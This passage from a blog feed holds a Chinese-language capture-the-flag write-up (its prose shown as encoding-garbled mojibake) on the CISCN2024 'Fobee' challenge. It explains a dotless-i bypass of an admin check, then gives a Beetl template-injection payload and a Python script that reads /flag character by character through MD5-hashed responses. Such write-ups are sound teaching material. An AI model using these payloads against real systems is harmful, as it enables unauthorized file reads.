class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>            ois.readObject();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728232439088.png" alt="image-20240728232439088"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2024/07/28/Commons-Collections/image-20240728233307715.png" class="" title="image-20240728233307715"><p>ç”±æ­¤CCé“¾å‘Šä¸€æ®µè½ï¼ŒCBé“¾éšç¼˜å†è®²å§ã€‚</p><p>çœ‹å®ŒCCé“¾åªèƒ½è¯´ååºåˆ—åŒ–åˆæ­¥å…¥é—¨ï¼Œå®æˆ˜è°ƒé“¾å­ä¹Ÿä¼šåç»­ä¸€æ­¥æ­¥å†™ä¸Šçš„ã€‚</p><p>æˆ‘ä¸€å®šè¦æˆä¸ºJavaé«˜æ‰‹ï¼ï¼ï¼ï¼</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/">https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/</a></p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">https://wx.zsxq.com/dweb2/index/tags/Javaå®‰å…¨æ¼«è°ˆ/551511412514</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125631391">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-commons-collections4åˆ©ç”¨é“¾ï¼ˆCC2å’ŒCC4ï¼‰-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121?ops_request_misc=%7B%22request_id%22:%22172217921116800225595414%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172217921116800225595414&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127580121-null-null.nonecase&utm_term=CC5">Javawebå®‰å…¨â€”â€”ååºåˆ—åŒ–æ¼æ´-CC&amp;CBé“¾æ€è·¯æ•´ç†-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#commonscollections5">Javaååºåˆ—åŒ–ä»URLDNSåˆ°CommonsCollections1-7 - KingBridge - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡å›½èµ›ç®—æ˜¯çˆ†ç§äº†ï¼Œæ‹¿ä¸‹äº†å…¨å›½æ€»å† å†›ã€‚</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>ç®—æ˜¯è®©å¤©æ¢åç»§æœ‰äººäº†å§ã€‚</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>ï¼ˆé¢†å¥–çš„é‚£ä½æ˜¯æˆ‘hhhhhï¼Œåœ¨å·¦äºŒæŒ¨ç€å·å¤§ç½‘å®‰é™¢é™¢é•¿ï¼‰</p><p>ä¸»è¦è¿˜æ˜¯ç¬¬äºŒå¤©çš„æ¸—é€æ¯”è¾ƒé€‚åˆæˆ‘å§å“ˆå“ˆï¼Œå¤©æ—¶åœ°åˆ©äººå’Œï¼Œé˜Ÿå‹ä¹Ÿå¾ˆç»™åŠ›ï¼Œæœ€åç›´æ¥ä¸€é¼“ä½œæ°”å†²åˆ°äº†æ¦œé¦–ğŸ˜€</p><p>æ¸—é€çš„wpä¸æ‰“ç®—å†™ï¼Œåæ­£ç½‘ä¸Šä¹Ÿæœ‰æ‰“çš„æ¯”æˆ‘å¤šä¸€é“é¢˜çš„å†™äº†wpï¼Œæˆ‘ä»¬æ¸—é€æ˜¯å¹¶åˆ—ç¬¬äºŒï¼Œæ®è¯´äº‘é•œä¼šä¸Šï¼Œåˆ°æ—¶å€™å†çœ‹çœ‹èƒ½ä¸èƒ½å†²ä¸‹DCäº†å´å½“æ—¶çš„é—æ†¾ã€‚</p><p>ç¬¬ä¸€å¤©çš„awdpçš„webï¼Œæˆ‘å°±ä¿®äº†ä¸€ä¸ªsolon-masterï¼Œé‚£é“çš„fixå¾ˆç®€å•ï¼Œå› ä¸ºlibé‡Œå¯ä»¥å‘ç°snakeyamlå’Œlogbackï¼Œç›´æ¥æŠŠå…³é”®å­—snakeå’Œlogç»™banæ‰å°±å¯ä»¥äº†ï¼Œç„¶åæˆ‘è¿‡æ»¤å¾—æ›´ç‹ ï¼Œç›´æ¥ä»€ä¹ˆ@ã€$ã€&lt; è¿™äº›å¸¸è§æ‰“jsonæ ¼å¼çš„ååºåˆ—åŒ–ç¬¦å·ç»™banäº†ï¼Œæ‰€ä»¥æ„å¤–çš„ç¬¬ä¸‰è½®å°±æ‹¿ä¸‹äº†fixï¼Œå¹¶åˆ—äºŒè¡€fixå§ç®—ï¼Œè¿‘ä¹æ˜¯åƒæ»¡äº†checkğŸ¤­ğŸ¤­ğŸ¤­</p><p>å”¯ç‹¬è¿™ä¸ªFobeeè®©æˆ‘å¤´ç–¼ï¼Œå½“æ—¶æˆ‘å‡ ä¹åé¢å‡ ä¸ªå°æ—¶éƒ½åœ¨çœ‹è¿™ä¸ªï¼Œç„¶è€Œä¿®å‡ºæ¥çš„ä¹Ÿåªæœ‰å‡ ä¸ªé˜Ÿï¼Œæ‰“å‡ºæ¥çš„ä¹Ÿä¸è¿‡ä¸‰ä¸ªæ•°ã€‚</p><p>å…¶ä¸­ä¸€ä¸ªæ‰“æ³•æ˜¯å­¦é•¿ç»™çš„ï¼Œè¿™é‡Œåšä¸€ä¸‹æµ…æµ…çš„å¤ç°ï¼ˆå­¦é•¿tqlå‘œå‘œå‘œå‘œï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆæ˜¯çœ‹çœ‹ä»£ç é€»è¾‘ï¼š</p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªè·¯ç”±åŸºæœ¬ä¸€ç›®äº†ç„¶ï¼Œé¦–å…ˆæ˜¯è¦çŸ¥é“è¿™ä¸ªModelAndViewçš„é»˜è®¤ä¼ å‚æ˜¯GETï¼Œä¼ å‚éƒ½æä¸æ˜ç™½åŸºæœ¬å¯ä»¥å‘Šåˆ«äº†ã€‚</p><p>é¦–å…ˆè¿›å»çš„æ ¹è·¯ç”±æ˜¯éœ€è¦ä½ ä¼ å‚usernameï¼Œä½†æ˜¯è¦æ»¡è¶³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ¬æ¥fixæˆ‘æ˜¯æƒ³ä¸‹é¢ååºåˆ—åŒ–ä¿®ä¸åŠ¨ï¼Œåœ¨è¿™é‡Œè¿‡æ»¤ç‹ ä¸€ç‚¹ï¼Œä½†æ˜¯å½“ç„¶ä¹Ÿæ˜¯checkä¸è¿‡ã€‚</p><p>å®ƒåˆè¦ä½ æ˜¯adminï¼Œåˆè¦ä½ toLowerCaseç»•è¿‡ä¸æ˜¯adminï¼Œé‚£æ€ä¹ˆç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>å…¶å®ä½ æ‰“å¼€IDEAï¼Œæ‹–è¿‡å»åˆ°toLowerCaseï¼Œå®ƒè‡ªå·±å°±å‘Šè¯‰ä½ äº†ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>è¿™ä¸ªlocaleçš„ä¸ä¸€è‡´ä¼šå¯¼è‡´ä¸€ä¸ªå­—ç¬¦æœ‰å¤šç§è¯†åˆ«æ–¹å¼ï¼Œè¿™é‡Œå°±å‘Šè¯‰ä½ äº† <strong>i</strong> åœ¨LATIN SMALL LETTERé‡ç­‰æ•ˆäº <strong>\u0131</strong> ,å…¶å®ä¸éœ€è¦æ·±å…¥ç†è§£ï¼Œè¿™é‡Œå°±èƒ½ç»•äº†ï¼Œè¿›å»åå°±èƒ½é‚£é“passwordçš„å›æ˜¾ã€‚</p><p>æˆ‘ä»¬æ¥ç€çœ‹è·¯ç”±ï¼Œä¸‹é¢çš„renderè·¯ç”±ï¼Œå¾ˆå®¹æ˜“çœ‹åˆ°attackçš„ç‚¹åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯base64è§£å¯†ä¼ å‚çš„tpï¼Œç„¶åè°ƒç”¨åˆ°BeetlKit.renderè¿›è¡Œæ¸²æŸ“ï¼Œå…¶å®åº”è¯¥å°±æ˜¯ä¸ªSSTIã€‚</p><p>ä½†æ˜¯è¿›å…¥è¿™é‡Œéœ€è¦passwordï¼Œè€Œä¸Šé¢è‹¥ç»•è¿›å»äº†å°±æ‹¿åˆ°äº†passwordï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±å®Œæˆäº†ã€‚</p><p>æ€ä¹ˆæ‰“SSTIå‘¢ï¼Œæˆ‘ä»¬è§£åŒ…ä¸€ä¸‹è¿™ä¸ªBeetlKitè·Ÿè¿›ä¸€ä¸‹ï¼š</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>ä¸€ä¸ªæ‰“æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹ã€‚</p><p>ç„¶è€Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹ä¸å‡ºæ¥ä»–è¦å¹²å•¥ï¼Œå…·ä½“åŸç†è¿™é‡Œæœ‰ç¯‡æ–‡ç« å¯ä»¥çœ‹çœ‹ï¼š</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">ä¸€æ¬¡æ„å¤–çš„ä»£ç å®¡è®¡â€”-JfinalCMSå®¡è®¡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>è¿™ä¸‹SSTIä¼šæ‰“äº†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å£å®ç°æ¶æ„ç±»åŠ è½½ï¼Œä½†æ˜¯beetlKitè¿‡æ»¤å¾—æœ‰ç‚¹ç‹ ï¼Œå¸¸è§„çš„ç›´æ¥æ‰“runtimeè¡Œä¸é€šã€‚</p><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å®ƒå†…éƒ¨ä»€ä¹ˆç©æ„èƒ½è°ƒç”¨runtimeæ‰“æˆåŠŸï¼Œå­¦é•¿æ‰¾åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" alt="image-20240728002829857"></p><p>æ˜¾ç„¶è¿™é‡Œå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯å›æ˜¾éœ€è¦ç±»ä¼¼ç›²æ³¨çš„æ‰‹æ®µï¼Œä¸€ä¸ªä¸ªå­—ç¬¦è¯»å‡ºæ¥ï¼ˆtqlå­¦é•¿wwwwwï¼‰ï¼Œç„¶åä¸‹é¢å®ƒä¼šè‡ªå·±æŠŠè¯»åˆ°çš„ä¸œè¥¿è¿›è¡ŒMD5åŠ å¯†å¹¶æ‰“åœ¨ç½‘é¡µä¸Šã€‚</p><p>è¿™ä¸ª&#x2F;envä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œåæ­£éƒ½æ˜¯jdk1.8æ‰€ä»¥æ„ä¹‰ä¸å¤§ã€‚</p><p>æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>ã€ æ ¹è·¯ç”±<span class="hljs-keyword">admin</span>ç»•è¿‡æ‹¿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>ã€ å¸¦<span class="hljs-keyword">password</span>è®¿é—®/renderï¼Œtpä½¿ç”¨base64åŠ å¯†çš„æ¶æ„æ³¨å…¥payloadè¯»flagï¼Œç”±MD5æ ¼å¼çˆ†å‡º<br><span class="hljs-number">3</span>ã€ MD5ä¸€ä¸ªä¸ªå­—ç¬¦çˆ†ç ´<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥è¿˜æŒºç®€å•ï¼Œä½†æ˜¯æ–­ç½‘ç¯å¢ƒç¡®å®å¾ˆæŠ˜ç£¨ï¼Œæ€»æœ‰é‚£ä¹ˆå‡ ä¸ªç¯å¢ƒé—®é¢˜ï¼Œè€Œä¸”å®¡è®¡éœ€è¦é è‡ªå·±ï¼Œæ¯”èµ›ä¹Ÿå¾ˆç´§å¼ ï¼Œæ‰€ä»¥åšå‡ºæ¥çš„äººç¡®å®å¾ˆç‰›è‡³äº†ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¿™é‡Œæˆ‘åœ¨vpsä¸Šè‡ªæ­ç¯å¢ƒæµ‹è¯•ï¼š</p><p>å…ˆadminç»•è¿‡ï¼Œä½†æ˜¯è¦urlç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ç„¶åè¯»æ–‡ä»¶ä¸€ä¸ªä¸ªå­—ç¬¦MD5çˆ†ç ´ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>åœ¨æ­¤ä½©æœä¸€ä¸‹å­¦é•¿çš„ç‰›è‡³åšæ³•ï¼Œæ¯”èµ›åœºä¸Šä¿©å­¦é•¿éƒ½ç”¨ç±»ä¼¼è¿™ç§æ–¹æ³•åšçš„ï¼Œéƒ½tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
